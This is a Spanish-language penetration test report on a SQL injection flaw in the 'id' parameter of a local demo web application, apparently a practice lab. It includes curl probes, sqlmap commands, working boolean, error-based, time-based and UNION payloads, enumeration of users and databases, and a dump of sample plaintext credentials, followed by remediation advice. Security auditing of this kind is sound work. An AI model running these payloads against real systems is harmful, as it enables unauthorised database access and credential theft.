# Informe de Auditoría SQL Injection

## Resumen Ejecutivo

Se auditó el objetivo `http://web.dev.local:8083` mediante reconocimiento manual con `curl` y validación/explotación con `sqlmap`.

Se confirmó una vulnerabilidad de **SQL injection** en el parámetro **GET `id`** del formulario principal `/?id=<valor>&Submit=Submit`.

La vulnerabilidad fue **explotada con éxito**, permitiendo identificar el usuario actual de base de datos (`root@%`), enumerar bases de datos y extraer el contenido de la tabla `sqli_demo.users`, incluyendo nombres de usuario, correos electrónicos y contraseñas en texto claro.

## Objetivo

- URL auditada: `http://web.dev.local:8083`
- Tipo de análisis: DAST orientado a SQL injection
- Estado: Vulnerabilidad confirmada y explotada

## Metodología

1. Reconocimiento con `curl` para identificar formularios y parámetros.
2. Pruebas manuales iniciales con valores válidos y caracteres de ruptura.
3. Validación automatizada con `sqlmap --batch`.
4. Explotación controlada con extracción de metadatos y volcado de datos de la tabla vulnerable.

## Vectores Analizados

### Vector 1: Página principal

- Endpoint: `GET /`
- Formulario detectado:
  - Método: `GET`
  - Parámetros: `id`, `Submit`
- Vector explotable confirmado:
  - `http://web.dev.local:8083/?id=1&Submit=Submit`

## Evidencia de Reconocimiento

El HTML de la página principal expone un formulario GET:

```html
<form action="#" method="GET">
    <input type="text" size="15" name="id" id="id">
    <input type="submit" name="Submit" value="Submit">
</form>
```

Prueba manual de línea base:

```bash
curl -sS 'http://web.dev.local:8083/?id=1&Submit=Submit'
```

Resultado observado:

```html
<pre>ID: 1<br />First name: John<br />Surname: Doe</pre>
```

Prueba manual con carácter de ruptura:

```bash
curl -sS 'http://web.dev.local:8083/?id=1%27&Submit=Submit'
```

El servidor devolvió un error SQL con fuga de información:

```text
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1 in /var/www/html/low.php:11
```

Esto confirma, además, exposición de detalles internos (`/var/www/html/low.php`, línea 11).

## Hallazgos

### Hallazgo 1: SQL Injection en `GET id`

- Severidad: **Crítica**
- Parámetro afectado: `id`
- Endpoint: `GET /?id=...&Submit=Submit`
- DBMS identificado: `MySQL >= 5.1 (MariaDB fork)`
- Tecnologías observadas: `Apache/2.4.65`, `PHP/8.1.33`

Comando de validación utilizado:

```bash
sqlmap --batch --level=5 --risk=3 -u 'http://web.dev.local:8083/?id=1&Submit=Submit' --flush-session
```

`sqlmap` confirmó las siguientes técnicas y payloads:

```text
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: id=1' OR NOT 8214=8214-- AqsF&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1' AND EXTRACTVALUE(7830,CONCAT(0x5c,0x716b787a71,(SELECT (ELT(7830=7830,1))),0x71766a7071))-- vHQx&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 5876 FROM (SELECT(SLEEP(5)))XpeC)-- tpQt&Submit=Submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x716b787a71,0x767a62745947437465636a7152757275674f6351784a5a7151546f5375627a746162546c74536443,0x71766a7071),NULL-- -&Submit=Submit
```

## Evidencia de Explotación

### Enumeración de usuario actual y bases de datos

Comando ejecutado:

```bash
sqlmap --batch -u 'http://web.dev.local:8083/?id=1&Submit=Submit' --current-user --dbs
```

Resultado:

```text
current user: 'root@%'

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo
[*] sys
```

### Enumeración de tablas en `sqli_demo`

Comando ejecutado:

```bash
sqlmap --batch -u 'http://web.dev.local:8083/?id=1&Submit=Submit' -D sqli_demo --tables
```

Resultado:

```text
Database: sqli_demo
[1 table]
+-------+
| users |
+-------+
```

### Volcado de la tabla `sqli_demo.users`

Comando ejecutado:

```bash
sqlmap --batch -u 'http://web.dev.local:8083/?id=1&Submit=Submit' -D sqli_demo -T users --dump
```

Resultado:

```text
Database: sqli_demo
Table: users
[8 entries]
+---------+---------------------+-------------+-----------+-----------+------------+
| user_id | email               | password    | username  | last_name | first_name |
+---------+---------------------+-------------+-----------+-----------+------------+
| 1       | admin@example.com   | password123 | admin     | Doe       | John       |
| 2       | jane@example.com    | secret456   | jsmith    | Smith     | Jane       |
| 3       | bob@example.com     | mypass789   | bjohnson  | Johnson   | Bob        |
| 4       | alice@example.com   | qwerty123   | awilliams | Williams  | Alice      |
| 5       | charlie@example.com | password    | cbrown    | Brown     | Charlie    |
| 6       | diana@example.com   | secure123   | ddavis    | Davis     | Diana      |
| 7       | eve@example.com     | hackme      | emiller   | Miller    | Eve        |
| 8       | frank@example.com   | admin123    | fwilson   | Wilson    | Frank      |
+---------+---------------------+-------------+-----------+-----------+------------+
```

Archivo de evidencia generado por `sqlmap`:

```text
/root/.local/share/sqlmap/output/web.dev.local/dump/sqli_demo/users.csv
```

## Impacto

La vulnerabilidad permite a un atacante no autenticado:

- Alterar la lógica de la consulta SQL.
- Enumerar el DBMS y la estructura de bases de datos.
- Extraer datos arbitrarios desde la base de datos.
- Obtener credenciales almacenadas en texto claro.
- Aprovechar la fuga de errores para acelerar el desarrollo de payloads.

## Conclusión

El objetivo `http://web.dev.local:8083` es **vulnerable a SQL injection crítica** en el parámetro `id` del formulario principal.

La explotación fue demostrada con éxito mediante:

- Confirmación automatizada con `sqlmap`.
- Enumeración de usuario actual y bases de datos.
- Extracción completa de la tabla `sqli_demo.users`.

Se recomienda corregir de forma prioritaria usando consultas preparadas, validación estricta del parámetro `id`, supresión de errores detallados en producción y revisión del almacenamiento de contraseñas para sustituir texto claro por hashes robustos.
